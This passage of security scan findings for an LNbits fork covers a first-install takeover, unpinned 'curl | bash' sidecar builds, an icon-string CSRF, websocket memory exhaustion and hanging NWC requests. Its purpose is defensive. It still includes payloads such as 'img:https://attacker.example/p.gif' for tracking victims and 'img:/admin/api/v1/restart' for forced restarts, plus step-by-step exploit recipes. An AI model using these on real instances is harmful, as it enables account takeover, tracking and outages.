3. [lnbits.sh:54–56](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits.sh#L54-L56)
   .env is created by copying .env.example verbatim; the script never generates, sets or prints a FIRST_INSTALL_TOKEN.
4. [.env.example:9–11](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/.env.example#L9-L11)
   FIRST_INSTALL_TOKEN is a commented-out optional example ('If set the user is required to enter this token'); it is the only place the token is mentioned in shipped docs, and nothing obliges the operator to set it. The copied .env therefore has no token and the bootstrap endpoint accepts any caller.
5. [lnbits/core/views/auth\_api.py:621–658](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L621-L658)
   PUT /api/v1/auth/first_install has no auth dependency: when settings.first_install is true and settings.first_install_token is None (626) it skips the token check, sets the super user's username and password to the caller's values (645-649), clears first_install (650) and returns a logged-in super-user session (658).
6. [lnbits/core/services/users.py:184–186](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/users.py#L184-L186)
   On a fresh install init_admin_settings creates the super user with provider=='env' (203-206), so check_admin_settings sets settings.first_install = True at every startup until the account is claimed: exactly the state the installers leave running on 0.0.0.0.
7. [lnbits/middleware.py:235–245](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/middleware.py#L235-L245)
   While first_install is set, every request is redirected to /first_install, so a single probe of the port fingerprints the instance as unclaimed.
8. [nix/modules/README.md:24–41](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/nix/modules/README.md#L24-L41)
   The NixOS 'Quick Start (Recommended)' overrides the module's safe defaults (lnbits-service.nix:43 host=127.0.0.1, :21 openFirewall=false) with host=0.0.0.0, openFirewall=true and LNBITS_ADMIN_UI=true, and does not mention FIRST_INSTALL_TOKEN.
9. [nix/modules/README.md:149–169](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/nix/modules/README.md#L149-L169)
   'First Time Setup' has the operator run nixos-rebuild switch (service already public) and only then open http://your-server-ip:5000 and 'follow the first-time setup wizard' (step 4, :169).

## Impact
The attacker becomes the super user of the instance: full read/write of admin settings (funding credentials entered later, admin/allowed users, auth methods), ability to install Python extensions (unsandboxed code as the service user), control of all accounts and wallets, and the ability to lock out the legitimate operator or stop the service.

## Reproduction steps
1. Attacker: anonymous on the internet. Requirement (AT:P): a freshly installed instance via lnbits.sh or the NixOS quick start whose operator has not yet completed /first_install; the attacker must connect during that window, which the operator's timing sets (foreground run then browser visit may be seconds; nohup/systemd starts or delayed visits widen it). The redirect to /first_install makes the state fingerprintable by any port scan. Exploit is a single PUT /api/v1/auth/first_install with username/password/password_repeat; no credential, token or victim interaction is needed, and no shipped control stands in front of it because the installer leaves FIRST_INSTALL_TOKEN unset.

## Recommended fix
1. lnbits.sh and the recommended NixOS configuration bind to all interfaces and open the host firewall before the super user has been claimed, while leaving the token-less first-install bootstrap enabled, so the bootstrap's 'operator connects first' precondition is not met and no document tells the operator to meet it. Fix criteria: A fresh instance produced by lnbits.sh or the NixOS quick start cannot be claimed by an arbitrary network peer: the installer generates a per-install FIRST_INSTALL_TOKEN, shows it only to the operator (terminal/log) and the server requires it on PUT /api/v1/auth/first_install; or the service is not reachable from untrusted networks (localhost bind, firewall closed) until the super user exists. Verify by installing with the documented commands on a host with a public address and confirming an unauthenticated remote PUT to /api/v1/auth/first_install is rejected.
2. The installation and admin-UI guides describe the first-run wizard without mentioning FIRST_INSTALL_TOKEN or the exposure window. Fix criteria: docs/guide/installation.md, docs/guide/admin_ui.md and nix/modules/README.md instruct the operator to set a first-install token (or keep the port closed) before starting a network-reachable instance, and the .env.example comment states the risk of leaving it unset.

---
**Severity:** HIGH
**Status:** Open
**Category:** Insecure Default Initialization
**CWE:** [CWE-1188](https://cwe.mitre.org/data/definitions/1188.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257557

---

# Published mainnet lnbits-sparkl2 image builds the Spark sidecar from unpinned HEAD and an unverified curl|bash installer

## Details
`docker/sparkl2/Dockerfile` produces the `lnbits-sparkl2` image that `.github/workflows/docker.yml` (called from `release.yml` on every version tag, for `<tag>`, `latest` and `latest-rc`) pushes to Docker Hub under the project's account. The image assembles the Spark funding sidecar — the Node.js process that holds the operator's mainnet Spark mnemonic and signs payments — from sources that nothing in this repository pins or verifies:

- `RUN git clone https://github.com/lnbits/spark_sidecar` followed by `RUN cd spark_sidecar && npm ci`: the sidecar is whatever the external repository's default-branch HEAD contains at the moment the release workflow runs. No commit, tag or digest is recorded, so the same LNbits tag built on two days can ship two different sidecars, and the content cannot be reviewed from lnbits/lnbits. `npm ci` installs the dependency set named by that HEAD's lockfile with lifecycle (install/postinstall) scripts enabled, so any package the HEAD lockfile points at also runs code as root at build time. Anyone who can change `lnbits/spark_sidecar`'s default branch — a maintainer of that separate repository, a compromised maintainer token, or a dependency update that pulls a compromised package into its lockfile — thereby ships code into the official mainnet image on the next LNbits release or manual dispatch without touching lnbits/lnbits and without any LNbits-side review step.
- `RUN curl -fsSL https://deb.nodesource.com/setup_lts.x | bash -`: an unpinned third-party script executed as root during the build; it decides the apt repository, signing key and Node.js build that end up in the image.
- The sibling `docker/boltzclient/Dockerfile` likewise copies `boltzd`/`boltzcli` from `boltz/boltz-client:latest`, a mutable tag with no digest.

At runtime (`entrypoint.sh:4`) the sidecar runs as root in the same container as LNbits with `SPARK_NETWORK=MAINNET`; the mnemonic is either supplied by the operator or generated by LNbits and POSTed to the sidecar (`lnbits/wallets/sparkl2.py:333-358`). Injected sidecar code can exfiltrate the mnemonic, sign arbitrary mainnet transactions, and read or alter the LNbits database, `.lnbits_auth_key` and `.super_user` in the shared data folder.

This is not the project's accepted design for the component: the desktop bundles (`.github/packaging/prepare_sidecars.py`) fetch the same sidecar by pinned revision, verify its sha256 against the committed `sidecars/pins.json`, and run `npm ci --omit=dev --ignore-scripts`, with `test_prepare_sidecars.py` asserting the pin is enforced. The docs' manual path (`docs/guide/wallets.md:162-164`, clone + `npm install` by the operator) is operator-initiated and operator-reviewed; the Docker path instead bakes an unreviewed upstream snapshot into an artifact that carries the LNbits release tag. The same `curl | sh` pattern for the uv installer (`Dockerfile:7,31`, `docker/*/Dockerfile`) is noted but not filed separately: it targets a vendor the project already fully trusts for its Python toolchain.

## Evidence
1. [docker/sparkl2/Dockerfile:14–15](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/docker/sparkl2/Dockerfile#L14-L15)
   `RUN git clone https://github.com/lnbits/spark_sidecar` fetches whatever the default branch HEAD is at build time (no --branch, no commit checkout, no digest), then `RUN cd spark_sidecar && npm ci` installs from that HEAD's lockfile with lifecycle scripts enabled (no --ignore-scripts, no .npmrc in the build context, no NPM_CONFIG_IGNORE_SCRIPTS). The sidecar code that will hold the operator's mainnet mnemonic is therefore decided by the external repository's state at the moment the release workflow runs, not by anything recorded or reviewable in lnbits/lnbits.
2. [docker/sparkl2/Dockerfile:5](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/docker/sparkl2/Dockerfile#L5)
   `curl -fsSL https://deb.nodesource.com/setup_lts.x | bash -` executes an unpinned, unverified third-party script as root during the image build; it chooses the apt source and signing key from which `nodejs` (line 8) is installed into the published image.
3. [.github/workflows/docker.yml:60–69](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/.github/workflows/docker.yml#L60-L69)
   The build-push step uses context docker/sparkl2 and pushes the result to Docker Hub as <DOCKER_USERNAME>/lnbits-sparkl2:<tag> for linux/amd64 and linux/arm64, so the unpinned content is what users pull.
4. [.github/workflows/release.yml:41–69](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/.github/workflows/release.yml#L41-L69)
   docker.yml is invoked on every version tag push (release.yml triggers on v*.*.* / *.*.* tags) three times — with the tag, `latest` and `latest-rc` — gated to github.repository == 'lnbits/lnbits', so the image is an official release artifact rebuilt from upstream HEAD on each release without a maintainer review step.
5. [docker/sparkl2/Dockerfile:30](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/docker/sparkl2/Dockerfile#L30)
   `ENV SPARK_NETWORK="MAINNET"`: the image is configured for real-money use; the sidecar built from unpinned sources receives or generates the operator's mainnet mnemonic.
6. [docker/sparkl2/entrypoint.sh:4](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/docker/sparkl2/entrypoint.sh#L4)
   `node spark_sidecar/server.mjs &` runs the cloned sidecar as root in the same container as LNbits (the base image has no USER directive), so injected sidecar code has the mnemonic in its process and full read/write access to the LNbits data folder, database and auth secrets.
7. [.github/packaging/prepare\_sidecars.py:33–45](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/.github/packaging/prepare_sidecars.py#L33-L45)
   Contrast showing the project's own standard for this component: the desktop bundles download the spark_sidecar tarball by pinned revision, verify its sha256 against sidecars/pins.json (download() raises on mismatch), and install with `npm ci --omit=dev --ignore-scripts` (lines 120-122); test_prepare_sidecars.py:62 asserts the pinned revision and checksum are used. The Docker image applies none of these controls.
8. [.github/packaging/sidecars/pins.json:2–5](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/.github/packaging/sidecars/pins.json#L2-L5)
   The committed pin (release v0.1.5, revision dbfed1fd…, sha256 e6720e4a…) that the desktop path enforces and the Docker path ignores; a reviewed, immutable reference for the sidecar already exists in this repository.
9. [docker/boltzclient/Dockerfile:3–6](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/docker/boltzclient/Dockerfile#L3-L6)
   Sibling published image with the same weakness class: `FROM boltz/boltz-client:latest` and `COPY --from=boltz /bin/boltzd /bin/boltzcli` take the funding-backend binaries from a mutable third-party tag without a digest, so the lnbits-boltz image content is likewise decided by upstream state at build time.

## Impact
The vulnerable system is the published image as it runs on the operator's host: injected sidecar code executes as root beside LNbits with the mainnet mnemonic in-process and the LNbits data folder (database, auth key, super-user id) readable and writable, so it can exfiltrate the seed and sign/broadcast payments (confidentiality), forge ledger state or settings (integrity), and halt the service (availability).

## Reproduction steps
1. Attacker position: control of, or compromise of, the default branch of github.com/lnbits/spark_sidecar (a repository outside this one with its own access list), of a package its HEAD lockfile selects, of deb.nodesource.com, or of the boltz/boltz-client:latest tag — all remote upstreams the build consumes over the network, so AT:P records that pre-existing upstream compromise. Once in place, delivery is automatic: the next version tag or workflow_dispatch rebuilds the image from upstream HEAD with no pin, hash or review and pushes it as the official lnbits-sparkl2:<tag>/latest; operators pull and run it with a mainnet mnemonic. No privileges on the vulnerable system and no user interaction beyond the ordinary pull are required.

## Recommended fix
1. The release-built mainnet image obtains the credential-holding Spark sidecar from an unpinned git HEAD with npm lifecycle scripts enabled, and installs its Node.js toolchain via an unpinned remote shell script, so the shipped image content is determined by external repositories and hosts at build time rather than by reviewed, verifiable inputs committed to this repository. Fix criteria: docker/sparkl2 fetches the sidecar by an immutable reference (commit hash or release tarball) and verifies it against a digest committed in this repository (for example the existing .github/packaging/sidecars/pins.json), installs its dependencies from the pinned lockfile with lifecycle scripts disabled unless a named package requires them, and installs Node.js from a pinned, checksum-verified source rather than a piped installer. Verify by building the image twice at different times and confirming identical sidecar and toolchain content, and by confirming the build fails when the fetched content does not match the recorded digest.
2. docker/boltzclient copies the boltz funding-backend binaries from a mutable upstream image tag (`boltz/boltz-client:latest`) without a digest. Fix criteria: The boltz base image is referenced by immutable digest (or a release tag plus digest) recorded in this repository, so a change to the upstream tag cannot alter the published lnbits-boltz image without a reviewed change here.

---
**Severity:** HIGH
**Status:** Open
**Category:** Unverified code download
**CWE:** [CWE-494](https://cwe.mitre.org/data/definitions/494.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257555

---

# Shared-wallet owner's icon string rendered as <img> in grantee's session forces cookie-authenticated GETs

## Details
A wallet owner (any registered user) who shares a wallet with another user controls the `extra.icon` string that LNbits renders inside the grantee's authenticated pages.

Flow: the attacker invites the victim by username (PUT /api/v1/wallet/share/invite); once the victim accepts, a 'lightning-shared' mirror wallet is created in the victim's account and `Wallet.mirror_shared_wallet()` (models/wallets.py:155-180) copies the OWNER's `extra.icon`/`extra.color` into it on every fetch (crud/wallets.py get_source_wallet). The owner can set `icon` to any string at any time through PATCH /api/v1/wallet (wallet_api.py:187-202); `WalletExtra.icon` is an unconstrained `str`.

The victim's UI binds that string to `<q-avatar :icon>` in the wallets overview (pages/wallets.vue:67-73), in the drawer shown on every page (components/lnbits-header-wallets.vue:69-76), in lnbits-manage-wallet-list.vue:19-20 and lnbits-wallet-extra.vue:7-9. Quasar 2's QIcon (vendor/quasar.umd.prod.js, `if(e.startsWith('img:'))return{img:!0,src:e.slice(4)}`) renders an `img:` name as `<img src=...>` and `svguse:` as `<svg><use href>`. The victim's browser therefore issues a GET to an attacker-chosen URL, with cookies, every time any page is viewed.

Consequences:
1. `icon = 'img:https://attacker.example/p.gif'`: exfiltrates the grantee's IP address, User-Agent and page-view timing to the owner for as long as the share exists (tracking of another user outside LNbits).
2. `icon = 'img:/admin/api/v1/restart'`: if the grantee is the super user, every page they load sends a cookie-authenticated GET to the restart endpoint (admin_api.py:260-268, `check_super_user`, plain GET, no CSRF/Origin check – decorators.py:255-257 accepts the cookie token, middleware.py has no fetch-metadata guard). `server_restart.set()` (server.py:81-90) terminates and restarts the uvicorn worker: a persistent, attacker-controlled outage of the whole instance that recurs each time the operator opens the UI, and that the operator cannot easily diagnose because the request is invisible in their own actions. Similarly `img:/admin/api/v1/backup` forces a DB dump on every page view and `img:/admin/api/v1/testemail` (any admin grantee) spams the configured notification mailboxes.

The root cause is that a value controlled by one account (the share owner) is rendered as a resource URL inside another account's session without validation, combined with state-changing admin operations being exposed on cookie-authenticated GET routes. The GET endpoints themselves are recorded in `admin-restart-backup-testemail-get-endpoints-cookie-csrf` (cross-site CSRF); this finding adds a different source and path: a same-origin request planted by another LNbits user through shared-wallet data, which is not mitigated by SameSite=Lax (auth_api.py:242) and needs no attacker-controlled site. It is also distinct from `shared-wallet-mirror-leaks-balance-and-paylinks-without-view-permission` (data disclosure to the grantee); here the mirror is the channel for the owner to act inside the grantee's browser. The precondition is that the victim has accepted a share invitation from the attacker, after which no further interaction is needed.

## Evidence
1. [lnbits/templates/pages/wallets.vue:67–72](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/templates/pages/wallets.vue#L67-L72)
   The wallets overview renders every wallet row, including 'lightning-shared' mirror wallets, with <q-avatar :icon="props.row.extra.icon">. Quasar 2's QIcon turns a name beginning with 'img:' into <img src="..."> (and 'svguse:' into <svg><use href>), so whoever controls extra.icon chooses a URL the viewer's browser fetches with the viewer's cookies.
2. [lnbits/templates/components/lnbits-header-wallets.vue:69–75](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/templates/components/lnbits-header-wallets.vue#L69-L75)
   The drawer included in base.html:65 renders the first `visible_wallet_count || 10` of the user's wallets (pinned first, lnbits-header-wallets.vue:45-48) with the same <q-avatar :icon="wallet.extra.icon"> on every authenticated page, so the forced fetch recurs on each page view whenever the mirror wallet is within that window; /wallets (pages/wallets.vue:67) renders every wallet unconditionally.
3. [lnbits/core/models/wallets.py:155–175](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/wallets.py#L155-L175)
   mirror_shared_wallet() copies the OWNER's extra.icon and extra.color into the grantee's mirror wallet (line 173) whenever the approved share has at least one permission (`if len(self.share_permissions)`), and the owner sets those permissions at invite time (services/wallets.py:39-61). crud/wallets.py get_wallets -> get_source_wallets (lines 193-219, 358-366) applies it on every fetch of the grantee's wallets, including get_user_from_account (crud/users.py:267) which builds the `user` JSON embedded in every page (base.html:105), so the owner's later icon edits propagate immediately into another user's UI.
4. [lnbits/core/views/wallet\_api.py:187–201](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/wallet_api.py#L187-L201)
   PATCH /api/v1/wallet accepts icon: str | None with the owner's admin key and stores it verbatim (wallet.extra.icon = icon or wallet.extra.icon). WalletExtra.icon (models/wallets.py:76-78) is a plain str with no allow-list, so 'img:https://attacker/x' or 'img:/admin/api/v1/restart' is accepted.
5. [lnbits/core/views/admin\_api.py:260–268](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/admin_api.py#L260-L268)
   GET /admin/api/v1/restart (check_super_user) calls server_restart.set() on a plain GET; GET /admin/api/v1/backup (270-) runs pg_dump/zip, GET /admin/api/v1/testemail (81-93, check_admin) sends mail. A cookie-bearing <img> request from the super user's browser reaches these.
6. [lnbits/decorators.py:251–256](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/decorators.py#L251-L256)
   check_access_token accepts the cookie_access_token cookie (SameSite=Lax, auth_api.py:276), and check_super_user -> check_admin -> check_account_exists chains onto it (decorators.py:422-451); no Origin, Referer or Sec-Fetch-* check exists in middleware.py or decorators.py, so a same-origin <img> GET from the grantee's page is authenticated exactly like a deliberate request.
7. [lnbits/server.py:81–89](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/server.py#L81-L89)
   When server_restart is set the supervisor marks the uvicorn server for exit, sleeps 3s, terminates the worker process and starts again, i.e. a full outage of several seconds on every trigger.

## Impact
Confidentiality LOW: the victim's IP/User-Agent and browsing cadence are leaked to the attacker's host for the lifetime of the share. Integrity LOW: forced side-effecting admin GETs such as /admin/api/v1/testemail. Availability HIGH when the grantee is the super user: `img:/admin/api/v1/restart` restarts the whole LNbits process on every page view the operator makes, an instance-wide, recurring outage; for admin grantees /admin/api/v1/backup forces repeated pg_dump/zip work.

## Reproduction steps
1. Attacker: any registered user with a lightning wallet. They invite the target by username and wait for acceptance (one conscious action by the victim; invitations appear in the victim's UI). Thereafter the attacker sets `icon` via PATCH /api/v1/wallet with their own admin key to an `img:` URL. Every authenticated page the victim loads renders the drawer/wallet list and the browser GETs the URL with the victim's session cookie; no CSRF, Origin or Sec-Fetch check exists. Works over the network with no non-default configuration.

## Recommended fix
1. WalletExtra.icon is an unconstrained string accepted by PATCH /api/v1/wallet and copied from the owner's wallet into other users' mirror wallets, then bound to QIcon which interprets `img:`/`svguse:` prefixes as resource URLs. Fix criteria: Icon values are validated against an allow-list of plain icon names (no `img:`, `svguse:`, URLs or whitespace) both when stored and when mirrored; after the fix a shared-wallet owner setting `icon` to `img:<url>` must be rejected (or rendered as a default icon) and no network request to an attacker-chosen URL is issued by the grantee's browser.
2. Admin operations with side effects (restart, backup, test email) are exposed on GET routes authenticated solely by the session cookie, so any same-origin resource load performs them. Fix criteria: State-changing admin actions require a non-GET method and a CSRF defence (e.g. same-origin check via Sec-Fetch-Site/Origin or an explicit non-cookie credential such as the X-Api-Key header); a cookie-only GET from an <img> element must no longer restart the server or trigger backups/emails.

---
**Severity:** HIGH
**Status:** Open
**Category:** Cross-site request forgery
**CWE:** [CWE-352](https://cwe.mitre.org/data/definitions/352.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257554

---

# Websocket per-connection receive queue is never consumed, retaining every anonymous frame in memory

## Details
`WebsocketConnectionManager.listen` (lnbits/core/services/websockets.py:32-43) loops on `conn.websocket.receive_text()` and stores every frame with `conn.receive_queue.put_nowait(data)`. The queue is created in `connect()` as `Queue()` (maxsize 0, unbounded) and `receive_queue` is read nowhere in the production tree (`rg receive_queue` finds only the dataclass field, the construction, this put and a unit test), so it is write-only storage: every byte a client sends is retained in process memory for the life of the connection. There is no per-message, per-connection or global cap and no consumer that would ever release it.

The route `/api/v1/ws/{item_id}` (lnbits/core/views/websocket_api.py:15-18) has no authentication dependency and is mounted unconditionally (core/__init__.py:49). The shipped request gates do not touch it: `block_allow_ip_middleware` and the SlowAPI rate limiter are registered with `@app.middleware("http")` / for http scope only, so websocket scopes pass straight through. The shipped launcher (server.py:58-69, used by the Docker CMD and the NixOS unit) sets only `ws_max_queue` and `ws_ping_timeout`. Assumption: uvicorn 0.40.0 (pinned) defaults `ws_max_size` to 16 MiB per message; that per-message limit does not bound the aggregate, which grows by the cumulative bytes sent.

An anonymous client that keeps one connection open and streams text frames grows the LNbits heap linearly with the data sent; several connections multiply it. The outcome is OOM termination of the single LNbits process (API, UI, funding-source listeners, payment workers) until it is restarted, repeatable at once. This is retention set by attacker input, not transient load: identical frames to a server that processed or discarded them would be freed. The sibling WASM hub in this same tree (lnbits/core/wasm_ext/api/websockets.py:62-77) caps message size, rate-limits and consumes each frame, which shows the core hub's omission is a defect rather than a design choice.

Aggravation (dependency behaviour, not verified in this checkout): only `WebSocketDisconnect` is caught in listen(); if, as Starlette 0.48.0's `receive_text` does to our recollection, a binary frame raises `KeyError` on `message["text"]`, the exception escapes before the removal at :39-41 and the `WebsocketConnection` with its full queue stays referenced from `active_connections` after the socket closes, so the retained memory would survive disconnect.

Secondary sink: the same loop logs the whole frame at DEBUG (:36). `configure_logger` (lnbits/utils/logger.py:63-77) installs a DEBUG `debug.log` file sink whenever `enable_log_to_file` is true (default True, settings.py:1180) regardless of `settings.debug`; rotation is 100 MB and retention time-based (3 months), so client frames also grow disk, and with `lnbits_admin_ui` on (default) each line is forwarded to the super-user log channel.

Root cause: input from an untrusted peer is accumulated in an unbounded in-memory structure that has no consumer.

## Evidence
1. [lnbits/core/services/websockets.py:32–43](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/websockets.py#L32-L43)
   listen() appends every text frame received from the client to conn.receive_queue with put_nowait and loops; the queue is unbounded (Queue() with maxsize 0) and nothing anywhere in the code base reads from it, so all received data is retained for the life of the connection. The same loop also writes each frame to the DEBUG log.
2. [lnbits/core/services/websockets.py:21–30](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/websockets.py#L21-L30)
   connect() accepts any anonymous socket and allocates the queue; no limit on connections per client or on total queued bytes.
3. [lnbits/core/views/websocket\_api.py:15–18](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/websocket_api.py#L15-L18)
   The route is unauthenticated, so the sender is an anonymous network peer.
4. [lnbits/utils/logger.py:63–77](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/utils/logger.py#L63-L77)
   With enable_log_to_file (default True) a DEBUG-level debug.log sink is always active, so each injected frame is also appended to disk, rotated at 100 MB and retained for 3 months — a second unbounded sink for the same anonymous input.

## Impact
Process memory exhaustion kills the single LNbits process: API, UI, funding-source payment listeners and notification workers all stop until restart, and the attack can be repeated immediately. Disk growth through the always-on DEBUG file sink is a secondary effect. No confidentiality or integrity impact.

## Reproduction steps
1. Anonymous attacker opens ws://host/api/v1/ws/<anything> (no auth dependency on the route; IP-block and rate-limit middleware are http-scope only and never see websocket connections), then streams text frames as fast as the link allows. Each frame is appended to an unbounded asyncio.Queue nobody reads, so resident memory grows by the cumulative bytes sent until the process is OOM-killed; parallel connections accelerate it. No race, user interaction or non-default configuration is needed; the Docker image and NixOS unit launch the same server.py path. Assumed dependency behaviour: uvicorn 0.40.0 default ws_max_size 16 MiB per message (irrelevant to the aggregate bound).

## Recommended fix
1. Received websocket frames are stored in an unbounded per-connection queue that is never consumed, and only WebSocketDisconnect removes the connection from active_connections. Fix criteria: Remove the receive queue (discard inbound frames the server does not use) or bound it (maxsize with drop/close on overflow) and give it a consumer; cap inbound message size and close oversize senders as the WASM hub does; ensure any exception on the receive path removes the connection from active_connections. A client streaming frames must not increase process memory beyond a fixed per-connection cap, and nothing may retain inbound data after the socket closes.
2. Every inbound frame from anonymous clients is written to the DEBUG log, which is always persisted to debug.log when file logging is on. Fix criteria: Do not log client-supplied frame contents (or truncate and log only when settings.debug is set), and make the file sink honour the configured level so anonymous input cannot grow log storage without bound.

---
**Severity:** HIGH
**Status:** Open
**Category:** Resource Exhaustion
**CWE:** [CWE-770](https://cwe.mitre.org/data/definitions/770.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257553

---

# Relay CLOSED frame drops pending NWC request subscription without resolving its future, hanging callers forever

## Details
NWCConnection keeps one asyncio future per outstanding NIP-47 request in `self.subscriptions`, keyed by request event id, and relies solely on `_handle_timeouts()` to raise 'timed out' on any future still registered after `subscription_timeout` (10 s). The relay-side CLOSED handler removes a subscription from that dict without resolving its future, after which nothing can ever wake the caller.

`_on_closed_message()` (nwc.py:1106-1116) handles a NIP-01 `["CLOSED", <sub_id>, <reason>]` frame by calling `_close_subscription_by_subid(sub_id, send_event=False)` (nwc.py:871-900), which pops the entry (line 892) and sets `closed = True` but never calls `future.set_exception()`/`set_result()`; the returned subscription is discarded. The relay knows every sub_id (it received the REQ in `call()`), CLOSED frames carry no signature, and benign relays also emit CLOSED for REQs they refuse (NIP-42 `auth-required:`, per-connection subscription caps, filter errors). Because the entry is gone, `_handle_timeouts()` (nwc.py:943-986) never sees it, no reconnect or `close()` path touches orphaned futures, and `call()` (nwc.py:1312-1378) blocks on `await future` forever.

A secondary variant of the same pop-before-resolve pattern exists on the response path (`_on_event_message`, nwc.py:1046-1080): the subscription is popped by `_close_subscription_by_eventid()` before the content is decrypted and validated, so 'Unexpected result type' / 'Malformed response' / decryption errors also leave the future unresolved. That variant requires a signed event from the NWC service (the funding backend, trusted by design) and is noted for remediation completeness.

Impact (when NWCWallet is the configured funding source, a documented option in docs/guide/wallets.md:389-397): the LNbits coroutine that issued the request never returns. Affected callers: `create_invoice()` (POST /api/v1/payments and LNURL-pay invoice creation hang, payments.py:369 awaits it with no timeout), `status()` (api.py:63, watchdog / balance checks), `get_invoice_status()`/`get_payment_status()` (used by `update_pending_payment` and the `check_pending_payments` permanent task), and `_maintain_pending_invoices()` inside `paid_invoices_stream()` (nwc.py:747-756). A hang in the latter stalls `fundingsource_invoice_producer` permanently, so incoming payments are no longer credited by the stream; a hang inside `check_pending_payments` stops that permanent task, and `_catch_everything_and_restart()` (task_manager.py:387-400) restarts only on an exception, which a pending await never raises. Outgoing `pay_invoice` is the exception: core wraps it in `asyncio.wait_for` (core/services/payments.py:933), though the background task itself leaks. Recovery requires a process restart.

Contrast: a relay that merely drops or delays responses only causes a 10 s timeout and a clean error, which is the failure mode `_handle_timeouts()` is shipped to bound (its comment at nwc.py:952-958 says so). The CLOSED path acts around that control, converting a recoverable relay fault into a permanent, silent hang (the frame is logged at warning level and the caller never resumes), and the stall persists even after the relay returns to normal behaviour.

## Evidence
1. [lnbits/wallets/nwc.py:1106–1116](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/nwc.py#L1106-L1116)
